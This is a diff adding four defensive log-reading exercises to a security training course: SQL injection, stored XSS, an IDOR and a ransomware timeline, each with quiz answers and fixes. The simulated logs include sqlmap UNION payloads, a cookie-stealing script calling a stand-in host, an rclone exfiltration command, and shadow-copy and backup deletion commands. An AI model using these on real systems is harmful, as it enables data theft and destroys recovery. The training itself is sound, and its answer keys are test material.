@@ -4976,7 +4976,10 @@
    }
   ],
   "category": "Security operations",
-  "card": "Find the attack in a Linux auth log"
+  "card": "Find the attack in a Linux auth log",
+  "also": [
+   "incident-response"
+  ]
  },
  {
   "id": "header-inspector",
@@ -5607,6 +5610,454 @@
    {
     "label": "Debian security tracker",
     "url": "https://security-tracker.debian.org/tracker/"
+   }
+  ]
+ },
+ {
+  "id": "sqli-log",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "Web security",
+  "minutes": 10,
+  "lesson": "web-sqli",
+  "title": "Read the log: SQL injection",
+  "skill": "Spot SQL injection in a web server log, judge whether it worked and say what fixes it",
+  "card": "Find the attack, and whether it worked",
+  "intro": "Kettleby Tea's shop threw errors overnight, then someone logged in to the admin area. Read the web server log and work out what happened.",
+  "artifact": {
+   "kind": "log",
+   "name": "access.log (nginx)",
+   "text": "Simulated access log, Kettleby Tea Co. online shop (fictional), nginx 1.24.0, combined log format, 4 Nov 2026 (UTC).\nSimplified: a real night has thousands of lines, and sqlmap's real probes use random numbers; these are the lines around the incident, shortened.\n\n198.51.100.23 - - [04/Nov/2026:02:10:44 +0000] \"GET /products.php?id=12 HTTP/1.1\" 200 5123 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1\"\n198.51.100.23 - - [04/Nov/2026:02:11:02 +0000] \"GET /search.php?q=o%27brien+teapot HTTP/1.1\" 200 3311 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1\"\n203.0.113.77 - - [04/Nov/2026:02:14:07 +0000] \"GET /products.php?id=12%27 HTTP/1.1\" 500 612 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"\n203.0.113.77 - - [04/Nov/2026:02:14:08 +0000] \"GET /products.php?id=12%20AND%201%3D1 HTTP/1.1\" 200 5123 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"\n203.0.113.77 - - [04/Nov/2026:02:14:08 +0000] \"GET /products.php?id=12%20AND%201%3D2 HTTP/1.1\" 200 1840 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"\n203.0.113.77 - - [04/Nov/2026:02:14:11 +0000] \"GET /products.php?id=12%20ORDER%20BY%205--%20- HTTP/1.1\" 500 612 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"\n203.0.113.77 - - [04/Nov/2026:02:14:11 +0000] \"GET /products.php?id=12%20ORDER%20BY%204--%20- HTTP/1.1\" 200 5123 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"\n203.0.113.77 - - [04/Nov/2026:02:16:40 +0000] \"GET /products.php?id=-1%20UNION%20ALL%20SELECT%20NULL%2Cusername%2Cpassword_hash%2CNULL%20FROM%20users--%20- HTTP/1.1\" 200 48211 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"\n198.51.100.61 - - [04/Nov/2026:02:20:15 +0000] \"GET /products.php?id=7 HTTP/1.1\" 200 4987 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15\"\n192.0.2.15 - - [04/Nov/2026:02:31:09 +0000] \"POST /admin/login.php HTTP/1.1\" 302 0 \"https://shop.kettleby.example/admin/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\"\n192.0.2.15 - - [04/Nov/2026:02:31:10 +0000] \"GET /admin/ HTTP/1.1\" 200 7302 \"https://shop.kettleby.example/admin/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\"\n192.0.2.15 - - [04/Nov/2026:02:33:47 +0000] \"GET /admin/orders/export.csv HTTP/1.1\" 200 3120558 \"https://shop.kettleby.example/admin/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\"",
+   "placeholder": "e.g. 203.0.113.77"
+  },
+  "primer": {
+   "title": "Reading a web server log line",
+   "keys": [
+    {
+     "icon": "users",
+     "label": "Who",
+     "text": "The first field is the IP address that sent the request."
+    },
+    {
+     "icon": "doc",
+     "label": "What",
+     "text": "The request in quotes: method, page and anything after the ?."
+    },
+    {
+     "icon": "gauge",
+     "label": "Result",
+     "text": "The status code, then how many bytes came back."
+    }
+   ],
+   "results": [
+    [
+     "200",
+     "OK: the page was sent",
+     "good"
+    ],
+    [
+     "302",
+     "Redirect, often after a successful login",
+     "warn"
+    ],
+    [
+     "500",
+     "The server hit an error (here, broken SQL)",
+     "bad"
+    ],
+    [
+     "%27, %20, %3D",
+     "URL encoding for ' (quote), a space and =",
+     "warn"
+    ]
+   ]
+  },
+  "steps": [
+   {
+    "type": "text",
+    "q": "Which IP address is testing the shop for SQL injection?",
+    "answers": [
+     "203.0.113.77"
+    ],
+    "hint": "Look at the user agent at the end of each line: one names the tool.",
+    "explain": "203.0.113.77 sends a stray quote, then AND 1=1 and AND 1=2, then UNION SELECT, all from sqlmap, a well-known SQL injection tool. A user agent can be faked, but the requests give it away anyway.",
+    "where": "sqlmap"
+   },
+   {
+    "type": "choice",
+    "q": "198.51.100.23 searched for o%27brien (O'Brien), which also contains a quote. Is that an attack?",
+    "options": [
+     "Yes: any quote in a URL is SQL injection",
+     "No: it's a normal search for a name with an apostrophe, and the page loaded fine",
+     "Yes: it came from an iPhone",
+     "Can't tell without the database"
+    ],
+    "answer": 1,
+    "explain": "Names like O'Brien contain apostrophes, so a quote alone proves nothing. What matters is the pattern: probing, logic tests and SQL keywords, as 203.0.113.77 sends.",
+    "where": "o%27brien"
+   },
+   {
+    "type": "choice",
+    "q": "Adding AND 1=1 returns 5123 bytes, but AND 1=2 returns only 1840. What does that tell the attacker?",
+    "options": [
+     "Nothing: sizes vary at random",
+     "The id value is being run as part of a SQL query, so they can ask the database true or false questions",
+     "The server is overloaded",
+     "The product is out of stock"
+    ],
+    "answer": 1,
+    "explain": "If the input were treated as plain data, both requests would fail the same way. A true condition shows the product and a false one hides it, so the input is changing the query: it's injectable.",
+    "where": "AND%201%3D2"
+   },
+   {
+    "type": "choice",
+    "q": "Look at the UNION request at 02:16:40. Did the attacker get data out?",
+    "options": [
+     "No: it's only a GET request",
+     "Probably: it asks for usernames and password hashes from the users table, and the reply is about nine times bigger than a normal product page",
+     "No: the status is 200, which means it was blocked",
+     "Only if it returned a 500"
+    ],
+    "answer": 1,
+    "explain": "A UNION SELECT adds the attacker's own query to the page's query. A 200 with 48211 bytes instead of about 5000 strongly suggests the users table was printed into the page.",
+    "where": "UNION"
+   },
+   {
+    "type": "choice",
+    "q": "At 02:31 someone logs in to /admin from a different IP and downloads the orders export. How should you treat it?",
+    "options": [
+     "As a normal admin login: the password was right",
+     "As a likely account takeover using credentials taken from the database: reset admin passwords, end sessions and treat the export as a possible data breach",
+     "Ignore it: the IP is different from the attacker's",
+     "Block 203.0.113.77 and close the case"
+    ],
+    "answer": 1,
+    "explain": "Attackers often move to a second address. A first-ever admin login straight after the users table leaked, followed by a 3 MB customer export, is the likely payoff. Customer data leaving may need reporting (in the UK, to the ICO within 72 hours if there's a risk to people).",
+    "where": "export.csv"
+   },
+   {
+    "type": "choice",
+    "q": "What actually fixes the hole in products.php?",
+    "options": [
+     "A web application firewall rule for the word UNION",
+     "Parameterised queries (prepared statements), so the id is always treated as data, never as SQL",
+     "Hiding error messages",
+     "Blocking sqlmap's user agent"
+    ],
+    "answer": 1,
+    "explain": "With a parameterised query the database receives the SQL and the value separately, so input can't change the query. A WAF and hidden errors can slow attackers down, but they're extra layers, not the fix."
+   }
+  ],
+  "next": [
+   {
+    "label": "OWASP: SQL injection prevention cheat sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+   }
+  ]
+ },
+ {
+  "id": "xss-review",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "Web security",
+  "minutes": 10,
+  "lesson": "web-xss",
+  "title": "The review that ran a script",
+  "skill": "Recognise stored XSS, follow it to a stolen session and choose the fixes",
+  "card": "A product review that stole a login",
+  "intro": "Someone downloaded Hollin & Daughter's customer list from the admin area, but nobody logged in. Read the reviews and the log to find out how.",
+  "artifact": {
+   "kind": "log",
+   "name": "Reviews export and access.log",
+   "text": "Simulated evidence, Hollin & Daughter Kitchenware (fictional), 9 Nov 2026 (UTC). Web server: nginx 1.24.0, combined log format.\nSimplified: a short extract of the reviews table and the log lines around it.\n\n--- reviews table (export) ---\nid   product         author     submitted            text\n811  kettle-classic  Priya M.   2026-11-08 18:02:11  Lovely kettle, boils fast.\n812  kettle-classic  Tom_B      2026-11-09 09:41:37  Great price! <script>new Image().src=\"https://cdn-stats.example.net/p.gif?c=\"+encodeURIComponent(document.cookie)</script>\n813  toast-rack      Dee        2026-11-09 10:02:50  Arrived broken, the replacement came quickly.\n\n--- access.log ---\n203.0.113.50 - - [09/Nov/2026:09:41:37 +0000] \"POST /reviews/submit HTTP/1.1\" 302 0 \"https://shop.hollin.example/product/kettle-classic\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\"\n198.51.100.34 - - [09/Nov/2026:10:15:02 +0000] \"GET /product/kettle-classic HTTP/1.1\" 200 18342 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1\"\n198.51.100.7 - - [09/Nov/2026:11:03:44 +0000] \"GET /admin/reviews?status=new HTTP/1.1\" 200 9120 \"https://shop.hollin.example/admin/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15\"\n203.0.113.50 - - [09/Nov/2026:11:05:19 +0000] \"GET /admin/ HTTP/1.1\" 200 7731 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\"\n203.0.113.50 - - [09/Nov/2026:11:06:02 +0000] \"GET /admin/customers/export.csv HTTP/1.1\" 200 2210934 \"https://shop.hollin.example/admin/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\"\n\n--- session cookie, as the shop sets it ---\nSet-Cookie: hd_session=4f1c...e09a; Path=/; Secure",
+   "placeholder": "e.g. script"
+  },
+  "steps": [
+   {
+    "type": "text",
+    "q": "Which review (id) contains a script?",
+    "answers": [
+     "812"
+    ],
+    "hint": "Look for HTML tags in the review text.",
+    "explain": "Review 812 hides a <script> tag after 'Great price!'. The shop saved it as it was and puts it into the product page for every visitor.",
+    "where": "<script>"
+   },
+   {
+    "type": "choice",
+    "q": "What does that script do when someone's browser runs it?",
+    "options": [
+     "Shows a pop-up",
+     "Sends the visitor's cookies for this site to cdn-stats.example.net, hidden inside an image request",
+     "Deletes the review",
+     "Nothing: scripts in reviews can't run"
+    ],
+    "answer": 1,
+    "explain": "new Image().src makes the browser request a 'picture' from the attacker's server, with document.cookie stuck on the end. No image appears, but the cookies arrive.",
+    "where": "document.cookie"
+   },
+   {
+    "type": "choice",
+    "q": "Why is this called stored XSS?",
+    "options": [
+     "It's stored in the attacker's browser",
+     "The script is saved on the site and runs for everyone who views the page, not just the person who sent it",
+     "It steals stored passwords",
+     "It only works on stored card details"
+    ],
+    "answer": 1,
+    "explain": "Reflected XSS bounces off one crafted link; stored XSS sits in the site's own data (a review, a comment, a profile) and runs for every viewer, including staff."
+   },
+   {
+    "type": "text",
+    "q": "Which IP address used the admin area without logging in?",
+    "answers": [
+     "203.0.113.50"
+    ],
+    "explain": "203.0.113.50 (the same address that posted review 812) loads /admin/ at 11:05 with no login request before it.",
+    "where": "GET /admin/ HTTP"
+   },
+   {
+    "type": "choice",
+    "q": "How did they get into the admin area?",
+    "options": [
+     "They guessed the admin password",
+     "An admin opened the review queue at 11:03, the script sent the admin's session cookie, and the attacker reused it two minutes later",
+     "The admin page has no protection at all",
+     "Through the iPhone visitor"
+    ],
+    "answer": 1,
+    "explain": "A session cookie proves you've already logged in. Steal it and you are that user, no password or MFA needed, until the session ends.",
+    "where": "status=new"
+   },
+   {
+    "type": "choice",
+    "q": "What should the shop do first?",
+    "options": [
+     "Email Tom_B",
+     "Delete review 812, sign out every admin session and treat the customer export as a possible data breach",
+     "Change the admin's password only",
+     "Turn off reviews forever"
+    ],
+    "answer": 1,
+    "explain": "Remove the script so it stops running, kill the stolen session (a password change alone may not), then assess the export: personal data left the business."
+   },
+   {
+    "type": "choice",
+    "q": "Which pair of changes stops this happening again?",
+    "options": [
+     "A longer admin password and a CAPTCHA",
+     "Encode user content when it's shown (so <script> is displayed as text) and add HttpOnly to the session cookie",
+     "Move the admin area to a new URL",
+     "Only allow reviews from logged-in customers"
+    ],
+    "answer": 1,
+    "explain": "Output encoding means a review can't become code. HttpOnly (missing from the Set-Cookie line) stops scripts reading the cookie at all. A Content Security Policy adds another layer.",
+    "where": "Set-Cookie"
+   }
+  ],
+  "next": [
+   {
+    "label": "OWASP: XSS prevention cheat sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+   }
+  ]
+ },
+ {
+  "id": "idor-log",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "Web security",
+  "minutes": 8,
+  "lesson": "web-access",
+  "title": "One number at a time: an IDOR",
+  "skill": "Spot broken access control in an application log and say what the fix is",
+  "card": "A tenant reading everyone's invoices",
+  "intro": "Larkspur Lettings' portal sent far more invoices than usual one evening. Read the audit log and find out whose data went where.",
+  "artifact": {
+   "kind": "log",
+   "name": "Portal audit log",
+   "text": "Simulated application audit log, Larkspur Lettings tenant portal (fictional), 12 Nov 2026 (UTC).\nSimplified: one line per API request; 'owner' is the tenant the record belongs to.\n\n2026-11-12T18:58:02Z  user=4471  ip=203.0.113.88  POST /api/v1/login  status=200\n2026-11-12T19:02:11Z  user=4471  ip=203.0.113.88  GET /api/v1/invoices/20931  status=200  owner=4471\n2026-11-12T19:02:40Z  user=4471  ip=203.0.113.88  GET /api/v1/admin/users  status=403\n2026-11-12T19:04:37Z  user=4471  ip=203.0.113.88  GET /api/v1/invoices/20930  status=200  owner=3318\n2026-11-12T19:04:38Z  user=4471  ip=203.0.113.88  GET /api/v1/invoices/20929  status=200  owner=5102\n2026-11-12T19:04:38Z  user=4471  ip=203.0.113.88  GET /api/v1/invoices/20928  status=200  owner=2087\n2026-11-12T19:04:39Z  user=4471  ip=203.0.113.88  GET /api/v1/invoices/20927  status=200  owner=4410\n... 812 more lines like these, one invoice number lower each time, every one status=200 with a different owner ...\n2026-11-12T19:11:52Z  user=4471  ip=203.0.113.88  GET /api/v1/invoices/20114  status=200  owner=1290\n2026-11-12T19:12:30Z  user=4471  ip=203.0.113.88  GET /api/v1/tenants/3318/documents/passport.pdf  status=200  owner=3318\n2026-11-12T19:20:05Z  user=2266  ip=198.51.100.19  GET /api/v1/invoices/20931  status=200  owner=2266",
+   "placeholder": "e.g. owner="
+  },
+  "steps": [
+   {
+    "type": "text",
+    "q": "Which user id is reading other tenants' invoices?",
+    "answers": [
+     "4471"
+    ],
+    "explain": "User 4471 opens their own invoice (owner=4471), then counts down through invoice numbers that belong to other tenants.",
+    "where": "invoices/20930"
+   },
+   {
+    "type": "choice",
+    "q": "What gives it away in the log?",
+    "options": [
+     "The status codes are 500",
+     "The owner doesn't match the user, and the invoice numbers go down by one, about one a second",
+     "The login took too long",
+     "The requests use GET"
+    ],
+    "answer": 1,
+    "explain": "A person reads a few of their own invoices. A script walking through hundreds of numbers, each owned by someone else, is enumeration.",
+    "where": "owner=3318"
+   },
+   {
+    "type": "choice",
+    "q": "The admin page answered 403 but other people's invoices answered 200. What does that tell you?",
+    "options": [
+     "The portal is secure: it blocked the admin page",
+     "The portal checks roles (admin or not) but never checks that a record belongs to the person asking",
+     "403 means the invoices are encrypted",
+     "The attacker gave up"
+    ],
+    "answer": 1,
+    "explain": "That's an insecure direct object reference (IDOR): the check is 'are you logged in?' rather than 'is this yours?'. Function-level checks don't cover object-level access.",
+    "where": "status=403"
+   },
+   {
+    "type": "choice",
+    "q": "What makes 19:12:30 worse than the invoices?",
+    "options": [
+     "Nothing: it's one more file",
+     "It's another tenant's passport scan: identity documents raise the harm, and the breach report needs to say so",
+     "PDF files can contain malware",
+     "It came from a different IP"
+    ],
+    "answer": 1,
+    "explain": "The same missing check covers documents too. Identity documents can be used for fraud, so the people affected need telling, and the ICO probably does as well.",
+    "where": "passport.pdf"
+   },
+   {
+    "type": "choice",
+    "q": "What's the right fix?",
+    "options": [
+     "Make invoice numbers random",
+     "On the server, check on every request that the logged-in tenant owns the record (or is staff allowed to see it)",
+     "Hide the invoice number from the URL",
+     "Rate-limit the API to 10 requests a minute"
+    ],
+    "answer": 1,
+    "explain": "Random numbers and rate limits make guessing slower but don't stop it. Only a server-side ownership check closes the hole."
+   },
+   {
+    "type": "choice",
+    "q": "At 19:20 user 2266 opens invoice 20931 from a different IP. What is it?",
+    "options": [
+     "The attacker again",
+     "Probably normal: 2266 is reading their own invoice (owner=2266)",
+     "A second attacker",
+     "An admin"
+    ],
+    "answer": 1,
+    "explain": "Check the owner before you raise the alarm. The user and owner match, so this one is the system working as it should.",
+    "where": "user=2266"
+   }
+  ],
+  "next": [
+   {
+    "label": "OWASP Top 10: Broken access control",
+    "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+   }
+  ]
+ },
+ {
+  "id": "ransomware-timeline",
+  "kind": "log",
+  "category": "Security operations",
+  "track": "SOC",
+  "minutes": 10,
+  "lesson": "ransomware",
+  "title": "Before the ransom note",
+  "skill": "Read a ransomware timeline: spot the early warnings, the data theft and the backup sabotage, and choose the first response",
+  "card": "The warnings hours before encryption",
+  "intro": "Marlow Street Dental's files were locked at 03:53. The EDR timeline shows the hours before. Find what was missed and what to do now.",
+  "artifact": {
+   "kind": "log",
+   "name": "EDR timeline: FS01",
+   "text": "Simulated EDR timeline (simplified export), Marlow Street Dental (fictional), file server FS01 (Windows Server 2019), 15 Nov 2026, times UTC.\nSimplified: one line per event the EDR flagged; real exports have many more fields.\n\n01:12:40  LOGON    user=MSD\\svc-backup  logon_type=10 (RemoteInteractive, RDP)  source=10.20.0.31 (RECEPTION-PC2)\n01:14:05  PROCESS  user=MSD\\svc-backup  C:\\Windows\\System32\\cmd.exe\n01:14:22  PROCESS  parent=cmd.exe  net.exe group \"Domain Admins\" /domain\n01:19:51  FILE     created C:\\ProgramData\\rc\\rclone.exe\n01:20:13  PROCESS  parent=cmd.exe  C:\\ProgramData\\rc\\rclone.exe copy D:\\Shares\\Patients mega:msd --transfers 8\n01:20:14  NETWORK  rclone.exe -> 198.51.100.140:443\n03:48:30  NETWORK  rclone.exe connection closed: 41.7 GB sent\n03:52:10  PROCESS  parent=cmd.exe  vssadmin.exe delete shadows /all /quiet\n03:52:12  PROCESS  parent=cmd.exe  bcdedit.exe /set {default} recoveryenabled No\n03:52:15  PROCESS  parent=cmd.exe  wbadmin.exe delete catalog -quiet\n03:53:01  PROCESS  parent=cmd.exe  C:\\ProgramData\\rc\\svhost.exe  (unsigned)\n03:53:04  FILE     D:\\Shares\\Patients\\2026\\Nov\\recall-list.xlsx renamed to recall-list.xlsx.lockd  (first of 18,204 renames in 6 minutes)\n03:59:40  FILE     created README_RESTORE.txt in 1,312 folders\n\nNote from the IT provider: nightly backups go to a NAS on the same network, joined to the domain, reachable with svc-backup.",
+   "placeholder": "e.g. rclone"
+  },
+  "steps": [
+   {
+    "type": "text",
+    "q": "Which account did the intruder use to get onto FS01?",
+    "answers": [
+     "svc-backup",
+     "msd\\svc-backup"
+    ],
+    "explain": "MSD\\svc-backup logs on over RDP from the reception PC. Service accounts run software in the background; they shouldn't log on interactively at all.",
+    "where": "logon_type=10"
+   },
+   {
+    "type": "choice",
+    "q": "Which event should have been the first alarm?",
+    "options": [
+     "03:59: the README files",
+     "01:12: a service account logging on over RDP in the middle of the night",
+     "03:53: the first renamed file",
+     "01:20: the network connection"
+    ],
+    "answer": 1,
+    "explain": "There were hours between the first sign and the encryption. An alert on interactive logons by service accounts would have given the team time to act."
+   },
+   {
+    "type": "choice",
+    "q": "What happened between 01:20 and 03:48?",
+    "options": [
+     "A normal backup",
+     "Patient files were copied out to cloud storage (41.7 GB), so this is a data breach even if the files can be restored",
+     "Windows updates",
+     "The files were encrypted"
+    ],
+    "answer": 1,
+    "explain": "rclone is a legitimate sync tool that attackers often use to steal data before encrypting it, so they can threaten to publish it too (double extortion).",
+    "where": "41.7 GB"
+   },
+   {
+    "type": "choice",
+    "q": "What do the three commands at 03:52 have in common?",
+    "options": [
+     "They speed up encryption",
+     "They delete Windows' shadow copies, turn off recovery and delete the backup catalogue, so the victim can't easily roll back",
+     "They install updates",
+     "They clear the event log"
+    ],
+    "answer": 1,
+    "explain": "Removing ways to recover is a standard step before encryption, and a strong signal on its own: alert on vssadmin delete shadows.",
+    "where": "vssadmin"
+   },
+   {
+    "type": "choice",
+    "q": "It's 04:00 and you've just been called. What first?",
+    "options": [
+     "Pay quickly before the price goes up",
+     "Wipe and rebuild FS01 straight away",
+     "Isolate FS01 and RECEPTION-PC2 from the network, but leave them switched on, and disable svc-backup",
+     "Email all staff from FS01"
+    ],
+    "answer": 2,
+    "explain": "Isolating stops the spread; keeping them powered on keeps evidence in memory; disabling the account cuts off the way in. Wiping destroys evidence, and paying is a business decision for later, with advice."
+   },
+   {
+    "type": "choice",
+    "q": "Read the IT provider's note. Why are those backups at risk?",
+    "options": [
+     "They aren't: backups are always safe",
+     "The NAS is on the same network and reachable with the stolen account, so the attacker can find and delete or encrypt it too",
+     "NAS drives are too slow",
+     "Backups don't include patient files"
+    ],
+    "answer": 1,
+    "explain": "Keep at least one copy offline or immutable (it can't be changed or deleted for a set time), with separate credentials, and test restoring from it.",
+    "where": "NAS"
+   }
+  ],
+  "next": [
+   {
+    "label": "NCSC: Mitigating malware and ransomware attacks",
+    "url": "https://www.ncsc.gov.uk/guidance/mitigating-malware-and-ransomware-attacks"
    }
   ]
  }
